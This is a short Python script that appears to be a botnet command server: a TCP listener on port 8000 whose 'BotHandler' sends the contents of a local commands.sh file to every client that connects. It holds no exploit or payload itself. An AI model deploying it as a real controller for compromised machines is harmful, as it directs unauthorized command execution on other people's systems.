import socketserver
import os

# Define the command file path
COMMAND_FILE = "commands.sh"

print("[+]Waiting for incoming connection")
print("-----------------------------------")

# Define the request handler
class BotHandler(socketserver.BaseRequestHandler):
    def handle(self):
        # Send the content of the command file to the client
        with open(COMMAND_FILE, "r") as file:
            command = file.read().strip()
            self.request.sendall(command.encode('utf-8'))

# Main entry point
if __name__ == "__main__":
    HOST, PORT = "", 8000  # Empty string for host binds to all interfaces
    tcpServer = socketserver.TCPServer((HOST, PORT), BotHandler)
    try:
        # Start the server to handle requests
        tcpServer.serve_forever()
    except Exception as e:
        print(f"There was an error: {e}")
